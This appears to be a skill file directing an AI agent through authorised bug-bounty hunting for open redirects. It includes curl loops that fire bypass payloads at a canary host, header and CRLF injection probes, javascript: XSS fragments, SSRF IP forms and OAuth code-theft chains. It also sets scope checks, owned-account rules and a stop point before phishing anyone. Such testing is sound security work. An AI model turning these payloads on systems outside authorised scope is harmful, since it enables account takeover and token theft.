---
name: zp-open-redirect
description: ZeroProtocol hunter for open redirect and unvalidated forwards. Use when a parameter such as next, url, returnTo, dest, continue, redirect_uri or callback decides where a response sends the browser, when a Location header echoes user input, when a login or logout flow returns to a supplied URL, or when a redirect allow-list needs bypass testing. Standalone open redirect is near-worthless - it earns its place as a feeder into OAuth code theft, SSRF filter bypass and token leakage via Referer.
---

# zp-open-redirect - the trusted first hop

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

An open redirect is a **feeder**, not a finding. Of the ~275 most-upvoted open-redirect reports on
HackerOne, 217 paid nothing - filed as standalone phishing vectors. The ones that paid were chained: a
`javascript:` sink, an OAuth code delivered to the reporter's own host, a CRLF split, a host-header
redirect that rewrote reset mail. **Find it in ten minutes, spend the rest on the second hop.**

---

## Procedure

**1. Harvest candidates from what recon already collected** - no packets needed.

```bash
PARAMS='redirect|redirect_to|redirect_uri|redirect_url|redirectUrl|post_logout_redirect_uri|url|u|link|next|nextUrl|return|returnTo|return_to|returnUrl|ReturnUrl|return_path|dest|destination|desturl|continue|goto|go|forward|target|to|out|r|back|backurl|callback|callback_url|checkout_url|success_url|cancel_url|RelayState|image_url|load_url|clickurl|originUrl'
grep -hoE "[?&]($PARAMS)=[^&\"'[:space:]]*" surface/urls.txt js/*.js 2>/dev/null | sort -u
grep -rnE "location\.(href|assign|replace)|window\.open\(|router\.(push|replace)\(|http-equiv=[\"']refresh" js/ 2>/dev/null
```

Path-shaped redirectors count too - `/out/<url>`, `/r/<url>`, `/link?u=`. With no URL corpus yet, feed those patterns to `zp-content-discovery`.

**2. Baseline with a value that is *supposed* to work.** If a legitimate relative path never reaches `Location`, the parameter does not drive the redirect and the rest is noise.

```bash
H=target.tld; EP="https://$H/login"; P=next
probe(){ curl -sk -o /dev/null -D - --max-time 15 "$1" | grep -iE '^(HTTP/|location:|refresh:)' | tr -d '\r'; }
probe "$EP?$P=/dashboard"
```

**3. Walk the bypass ladder.** Send payloads **raw** - the server must see them exactly as written, so
pre-encode any literal `#`, `&`, `%` or space (`%23`, `%26`, `%25`, `%20`); curl treats a real `#` as a fragment and never transmits it.

```bash
OOB=zp91234.canary.example      # a host YOU control and can read logs on
for p in "https://$OOB" "//$OOB" "https:$OOB" "https:/$OOB" "////$OOB" "/\\$OOB" "\\/\\/$OOB" \
         "https://$H@$OOB" "https://$H%40$OOB" "https://$H%5C@$OOB" "https://$H.$OOB" \
         "https://$OOB%23.$H" "https://$OOB%3F.$H" "https://$OOB%2F.$H" "https://$OOB%09" \
         "https%3A%2F%2F$OOB" "%252f%252f$OOB" "/..//$OOB" "/%2f%2f$OOB" \
         "https://$H/..%2f..%2f@$OOB" "http%0d%0a://$OOB"; do
  printf '%-44s ' "$p"
  curl -sk -o /dev/null -D - --max-time 15 "$EP?$P=$p" | grep -i '^location:' | tr -d '\r'; echo
done
```

A hit is a `Location` whose **authority** is `$OOB`. Read the authority, never the string - `Location: https://target.tld/x?u=https://$OOB` contains your host and goes nowhere near it.

**4. Classify it - server-side or client-side.** They have different ceilings.

```bash
curl -sk --max-time 15 "$EP?$P=https://$OOB" | grep -iEo "http-equiv=[\"']refresh[^>]*|location\.(href|assign|replace)[^;]{0,80}"
```

| Observation | Class | Ceiling |
|---|---|---|
| `3xx` + `Location: https://$OOB` | server-side | full - chains to SSRF and OAuth |
| `200` + `<meta http-equiv="refresh" content="0;url=…">` | client-side | phishing and OAuth; **no server fetcher follows it** |
| `200` + `location.href = <param>` | client-side DOM | phishing, plus **XSS** if `javascript:`/`data:` survives |

**5. Let a URL parser adjudicate, then a browser.** Every rung of the ladder is a disagreement
between the validator's parser and the navigator's - make it visible, then let the browser rule.

```bash
python3 - <<'PY'
from urllib.parse import urlsplit, urljoin
for c in ["//evil.tld", "/\\evil.tld", "https:evil.tld", "https://target.tld@evil.tld", "https://evil.tld#@target.tld"]:
    print(f"{c:34} stdlib_host={urlsplit(c).netloc!r:24} browser={urljoin('https://target.tld/login', c)}")
PY
lynx -dump "$EP?$P=//$OOB" 2>/dev/null | head -5 || curl -skL --max-time 20 "$EP?$P=//$OOB" | head -c 200
chromium --headless --disable-gpu --no-sandbox --virtual-time-budget=8000 \
  --dump-dom "$EP?$P=//$OOB" 2>/dev/null | grep -o 'ZP-CANARY-91234'
```

`stdlib_host=''` on a payload the browser sends to `evil.tld` is the bug in one line - exactly what
`startswith("/")` or `urlsplit(...).netloc in ALLOWED` gets wrong. `lynx` and `curl -L` witness 3xx chains
only; `meta refresh` and `location.href` need a real engine, and `vercel-labs/agent-browser` or `browsh`
drive one from a terminal. The artifact never changes - **your hostname in the address bar with your marker on screen, from a link that starts with the target's domain.**

**6. Header-driven redirects.** The target must still be the peer, so pin the connection.

```bash
IP=$(dig +short "$H" | grep -E '^[0-9.]+$' | head -1)
for hdr in "X-Forwarded-Host: $OOB" "X-Forwarded-Proto: http" "X-Forwarded-Scheme: http" \
           "X-Original-URL: /$OOB" "X-Rewrite-URL: /$OOB"; do
  printf '%-24s ' "${hdr%%:*}"
  curl -sk -o /dev/null -D - --max-time 15 "https://$H/login" -H "$hdr" | grep -i '^location:' | tr -d '\r'; echo
done
curl -sk -o /dev/null -D - --max-time 15 --resolve "$OOB:443:$IP" "https://$OOB/login" | grep -i '^location:'
```

A `Location` built from `Host`/`X-Forwarded-Host` beats any parameter redirect - the same code usually builds password-reset links. Hand it to `zp-jwt-oauth` and `zp-cache-poison`.

**7. Build the second hop - this is the whole job.**

| Chain | Shape | Route to |
|---|---|---|
| OAuth code theft | `redirect_uri=https://$H/out?url=https://$OOB/cb`, or prefix/traversal forms `https://$H.$OOB`, `https://$H/oauth/..%2f..%2f@$OOB` - then the same against `post_logout_redirect_uri`, which is validated far more loosely | `zp-jwt-oauth` |
| SSRF allow-list bypass | fetcher accepts `$H`; give it `https://$H/out?url=http://$OOB/hop2` and confirm hop 2 is unvalidated **before** aiming anywhere internal | `zp-ssrf` |
| Referer token leak | a page whose own URL holds a reset token or `code` redirects off-site; check `Referrer-Policy` is absent or `unsafe-url` | `zp-jwt-oauth` |
| `javascript:` / `data:` accepted | scheme survives into `location.href` - that is one-click XSS, not a redirect | `zp-xss` |
| CRLF in the parameter | `%0d%0a` injects a second header, splits the response, or lands in a cached copy | `zp-smuggling`, `zp-cache-poison` |
| Allowed host you can claim | `//sub.$H` where `sub` is a dangling CNAME | `zp-takeover` |

**8. Stop point for this class - state it in the report.** You stop at the `Location` header, or at your
own marker page in a real browser. You do **not** send the link to anyone, host a page imitating the
target's login, or capture or exchange a code belonging to another account. The OAuth chain is proven
with **two accounts you own** and your own canary host.

---

## Probes and payloads

| Payload | Breaks | Positive looks like |
|---|---|---|
| `https://$OOB` | no validation at all | `Location: https://$OOB` |
| `//$OOB` | `startswith("/")` checks - the single most common bug | `Location: //$OOB` |
| `https:$OOB`, `https:/$OOB` | slash-count normalisation; WHATWG inserts the slashes | `Location: https:$OOB` and the browser lands on `$OOB` |
| `/\$OOB`, `\/\/$OOB` | backslash treated as path server-side, as `/` by the browser | relative-looking `Location`, browser goes off-site |
| `https://$H@$OOB`, `https://$H%40$OOB` | `startswith("https://$H")` prefix checks - `$H` is userinfo | `Location` holds both hosts; the browser picks `$OOB` |
| `https://$OOB%23.$H`, `https://$OOB%3F.$H`, `https://$H.$OOB` | validators that search for `$H` anywhere in the string, or an unanchored regex | `$H` lands in fragment/query, or the authority is a host you registered |
| `https%3A%2F%2F$OOB`, `%252f%252f$OOB`, `/..//$OOB`, `/%2f%2f$OOB` | one decode too few or too many across proxy and origin; normalisation added by a *previous fix* | decoded form in `Location`, or a patched redirect re-opened |
| `https://$OOB%09`/`%20`, `http%0d%0a://$OOB`, `%0d%0aLocation:%20https://$OOB` | whitespace stripping, then CRLF into the response | trailer dropped and host accepted, or a second `Location` header |
| `https://$OOB。$H` (U+3002), `https://$OOB.$H.`, punycode homoglyph | IDNA applied by the browser, not the validator | authority resolves to your host |
| `javascript:/*--></script><svg onload=…>`, `data:text/html;base64,…` | scheme allow-list absent | script executes - that is `zp-xss` |
| `2130706433`, `0177.0.0.1`, `[::ffff:127.0.0.1]` as the second hop | numeric-IP forms inside a fetcher's filter | internal host reached - `zp-ssrf` |

Optional tooling if present - `nuclei -l candidates.txt -tags redirect -severity medium,high`, or
`openredirex -l candidates.txt -p payloads.txt`. Neither is required; step 3 is the whole technique, and a substring-matching tool produces the first false positive in the next section.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| `3xx` with an **authority** you control, reached from an in-scope host | **confirmed open redirect.** Low on its own. Chain before filing |
| the same, plus an OAuth `code`/token delivered to your canary | **confirmed ATO chain.** High/Critical - this is the report |
| `Location` built from `Host`/`X-Forwarded-Host` | confirmed, and higher - check reset mail and the cache |
| `javascript:`/`data:` survives into `location.href`, or `%0d%0a` yields a second header | file it as **XSS** or **CRLF response splitting** - both outrank the redirect |
| your host appears only in the **query or path** of `Location` | not a redirect. Killed - the classic scanner false positive |
| an interstitial "you are leaving target.tld" page requires a click | mitigated. Kills the OAuth and SSRF chains. Low at best |
| navigation needs the victim to paste or edit the URL, or credentials only the attacker has | no victim path. Killed |
| only `/path` values are accepted, normalised, and `//` plus `\` are rejected | correctly validated. Killed |
| OAuth `redirect_uri` is exact-matched against a registered value | killed for the OAuth chain; the standalone redirect may still exist |
| redirect works but the host is out of scope, or is a third-party link-tracker | **not yours to report.** Re-run `zp-scope check` |
| a scanner said "vulnerable" and you have no `Location` line of your own | unverified. Killed until you reproduce by hand |
| program rules list open redirect as out of scope or informational | killed as a standalone; **still worth building the chain** and filing that instead |

Two honest notes. A `meta refresh` or `location.href` redirect cannot be followed by a server-side
fetcher, so it does **not** chain to SSRF - say so rather than implying otherwise. And "phishing is now
possible" is not impact; name the asset the second hop takes.

---

## High-value patterns

- **`/login?next=` and `/logout?returnTo=`** - where this bug actually lives, and where the redirect fires while a session exists. `post_logout_redirect_uri` and SAML `RelayState` are validated far more loosely still, and barely hunted.
- **An open redirect on a host that is a registered OAuth callback** - turns exact-match `redirect_uri` validation into code interception. The highest-value shape in this class.
- **Password-reset and email-verification links** carrying both a token and a redirect parameter - Referer leakage is token theft with no phishing at all.
- **A redirect built from the `Host` header** - the same builder usually writes reset mail and absolute asset URLs.
- **A previous fix for this exact bug** - re-test `/..//`, `/%2f%2f`, `%252f` against every redirect already patched; a bypass-of-the-fix is a fresh finding.
- **Unanchored regex domain validation** (`if "target.com" in host`) - `target.com.attacker.tld`, one-click ATO.
- **Non-Latin and homoglyph authorities** (U+3002 ideographic full stop, trailing dot, punycode) - beat validators and link-blockers that normalise differently from the browser.
- **Link unfurlers, image proxies and PDF renderers** that follow 3xx - an allow-listed first hop is the whole SSRF filter bypass.
- **Mobile deep links and QR handlers** that accept a URL - hand to `zp-mobile`; app-link hijack is a much larger finding.

---

## Pitfalls

- **Filing it standalone.** Four in five of the top-voted reports in this class paid zero. Chain first.
- **Reading the string instead of the authority.** Your host in a query parameter is not a redirect.
- **Trusting `curl` as the witness for a client-side redirect.** It ignores `meta refresh` and JavaScript; the browser decides. Equally, claiming SSRF from a `meta refresh` - nothing server-side follows it.
- **Letting curl re-encode a payload.** A literal `#` never leaves your machine, and `--data-urlencode` double-encodes the very payloads that test double decoding.
- **Calling a `javascript:` sink an open redirect.** It is XSS; the severity and the fix differ.
- **Pointing a payload at a live third party.** Use a canary host you own - never a real `evil.tld`, a competitor, or another program's asset.
- **Sending the crafted link to a real user, or serving a login clone.** That is phishing; stop at the marker page.
- **Touching another account's OAuth `code`.** Two accounts you own, or no chain.
- **Mass-fuzzing every parameter on every URL.** The ladder is ~20 requests per endpoint; pick login, logout, OAuth and reset. And do not test a redirector on an out-of-scope or vendor domain just because it appeared in the target's HTML.
- **Reporting without naming the parser differential.** "The validator uses `startswith`, the browser uses WHATWG" is what gets the bug fixed and the report accepted.

---

## Hand off to

New hostname in the `Location` chain -> `zp-scope` before touching it. OAuth and token chains ->
`zp-jwt-oauth`. Server-side fetchers -> `zp-ssrf`. `javascript:`/`data:` schemes and DOM sinks ->
`zp-xss`. CRLF and header injection -> `zp-smuggling`, `zp-cache-poison`. Redirectors you have not found
yet -> `zp-content-discovery`; redirect logic in bundles -> `zp-js-secrets`. Claimable allow-listed
subdomain -> `zp-takeover`. Deep links and app links -> `zp-mobile`. Confirmed chain -> `zp-triage` then `zp-report`.

Class reference cross-checked against `usestrix/strix` (Apache-2.0) `open_redirect`.
